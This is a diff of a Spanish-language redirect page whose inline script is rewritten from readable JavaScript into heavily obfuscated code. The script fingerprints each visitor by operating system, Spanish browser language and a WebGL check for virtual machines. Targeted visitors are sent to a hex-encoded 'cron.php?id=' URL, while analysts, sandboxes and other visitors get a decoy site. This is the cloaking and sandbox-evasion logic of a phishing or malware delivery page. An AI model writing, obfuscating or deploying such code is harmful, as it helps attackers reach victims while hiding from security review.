@@ -5,78 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirigiendo...</title>
     <script>
-        (function(){
-            function esSistemaAceptado() {
-                var userAgent = window.navigator.userAgent.toLowerCase();
-                return userAgent.includes('windows') || userAgent.includes('android') || userAgent.includes('iphone');
-            }
-
-            
-            function detectarIdioma() { 
-                
-             const idiomaNavegador = (navigator.language || navigator.userLanguage).toLowerCase();
-             return idiomaNavegador.startsWith('es');
-
-            }
-
-            function isVirtualMachine() {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl');
-
-                if (gl) {
-                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-                        return renderer.includes('swiftshader'); 
-                    } else {
-                        return false; 
-                    }
-                } else {
-                    return false; 
-                }
-            }
-
-            
-            function getParameterByName(name) {
-                var urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get(name);
-            }
-
-            
-            function decodeHex(hexString) {
-                var str = '';
-                for (var i = 0; i < hexString.length; i += 2) {
-                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
-                }
-                return str;
-            }
-
-            var redirectOfficeHex = '68747470733a2f2f70726573656e6369612e70756a616e74652e636f6d2f';
-            var redirectCronHex = '68747470733a2f2f70726573656e6369612e70756a616e74652e6f72672f63726f6e2e7068703f69643d';
-
-            
-            function redirigirConId() {
-                var idBase64 = getParameterByName('id');
-
-            
-                if (!esSistemaAceptado() || !detectarIdioma() || isVirtualMachine()) {
-                    window.location.href = decodeHex(redirectOfficeHex);
-                    return;
-                }
-
-            
-                if (idBase64) {
-                    var cronUrl = decodeHex(redirectCronHex) + idBase64;
-                    window.location.href = cronUrl;
-                } else {
-                    window.location.href = decodeHex(redirectOfficeHex);
-                }
-            }
-
-            window.onload = function() {
-                redirigirConId();
-            };
-        })();
+   function _0x3a00(_0xd24600,_0x4fa4e3){var _0x209ebe=_0x209e();return _0x3a00=function(_0x3a00df,_0x331c63){_0x3a00df=_0x3a00df-0x132;var _0x3e0389=_0x209ebe[_0x3a00df];return _0x3e0389;},_0x3a00(_0xd24600,_0x4fa4e3);}function _0x209e(){var _0x3585dc=['fromCharCode','524951pDlyaU','toLowerCase','9957849ddhhks','userAgent','5QYUcYn','createElement','get','40LeLZBx','substr','4uzmowv','1049562OoCnAI','2835FjyWjI','userLanguage','language','368176tfrYWq','windows','startsWith','includes','68747470733a2f2f70726573656e6369612e70756a616e74652e636f6d2f','2043138GjryEU','568cNahnV','search','623331feqKUK','getContext','length','UNMASKED_RENDERER_WEBGL','canvas','location','href','navigator','68747470733a2f2f70726573656e6369612e70756a616e74652e6f72672f63726f6e2e7068703f69643d'];_0x209e=function(){return _0x3585dc;};return _0x209e();}(function(_0x3dad1c,_0x4f1ef4){var _0x36b9d8=_0x3a00,_0x2cb21e=_0x3dad1c();while(!![]){try{var _0x4c1df4=-parseInt(_0x36b9d8(0x13d))/0x1+-parseInt(_0x36b9d8(0x14b))/0x2+parseInt(_0x36b9d8(0x133))/0x3*(parseInt(_0x36b9d8(0x146))/0x4)+-parseInt(_0x36b9d8(0x141))/0x5*(-parseInt(_0x36b9d8(0x150))/0x6)+parseInt(_0x36b9d8(0x148))/0x7*(parseInt(_0x36b9d8(0x151))/0x8)+parseInt(_0x36b9d8(0x147))/0x9*(-parseInt(_0x36b9d8(0x144))/0xa)+parseInt(_0x36b9d8(0x13f))/0xb;if(_0x4c1df4===_0x4f1ef4)break;else _0x2cb21e['push'](_0x2cb21e['shift']());}catch(_0x14a735){_0x2cb21e['push'](_0x2cb21e['shift']());}}}(_0x209e,0x4ae73),(function(){var _0x286756=_0x3a00;function _0xf3136e(){var _0xaf7f45=_0x3a00,_0x1cad48=window[_0xaf7f45(0x13a)][_0xaf7f45(0x140)][_0xaf7f45(0x13e)]();return _0x1cad48[_0xaf7f45(0x14e)](_0xaf7f45(0x14c))||_0x1cad48[_0xaf7f45(0x14e)]('android')||_0x1cad48[_0xaf7f45(0x14e)]('iphone');}function _0x23ece8(){var _0x1e11b2=_0x3a00;const _0x820827=(navigator[_0x1e11b2(0x14a)]||navigator[_0x1e11b2(0x149)])[_0x1e11b2(0x13e)]();return _0x820827[_0x1e11b2(0x14d)]('es');}function _0x59bebd(){var _0x4e3468=_0x3a00,_0x5f159a=document[_0x4e3468(0x142)](_0x4e3468(0x137)),_0x1c2f87=_0x5f159a[_0x4e3468(0x134)]('webgl');if(_0x1c2f87){var _0x2c6028=_0x1c2f87['getExtension']('WEBGL_debug_renderer_info');if(_0x2c6028){var _0x224fa3=_0x1c2f87['getParameter'](_0x2c6028[_0x4e3468(0x136)])['toLowerCase']();return _0x224fa3[_0x4e3468(0x14e)]('swiftshader');}else return![];}else return![];}function _0x1e179d(_0x3e8b8c){var _0x413f89=_0x3a00,_0x5ef602=new URLSearchParams(window[_0x413f89(0x138)][_0x413f89(0x132)]);return _0x5ef602[_0x413f89(0x143)](_0x3e8b8c);}function _0x41625a(_0x329ced){var _0x866862=_0x3a00,_0x38b884='';for(var _0x1d142b=0x0;_0x1d142b<_0x329ced[_0x866862(0x135)];_0x1d142b+=0x2){_0x38b884+=String[_0x866862(0x13c)](parseInt(_0x329ced[_0x866862(0x145)](_0x1d142b,0x2),0x10));}return _0x38b884;}var _0x462070=_0x286756(0x14f),_0xead1fb=_0x286756(0x13b);function _0x3b33d9(){var _0x47c2c3=_0x286756,_0x48a2cd=_0x1e179d('id');if(!_0xf3136e()||!_0x23ece8()||_0x59bebd()){window[_0x47c2c3(0x138)][_0x47c2c3(0x139)]=_0x41625a(_0x462070);return;}if(_0x48a2cd){var _0xabcb60=_0x41625a(_0xead1fb)+_0x48a2cd;window[_0x47c2c3(0x138)][_0x47c2c3(0x139)]=_0xabcb60;}else window['location'][_0x47c2c3(0x139)]=_0x41625a(_0x462070);}window['onload']=function(){_0x3b33d9();};}()));
     </script>
 </head>
 <body>
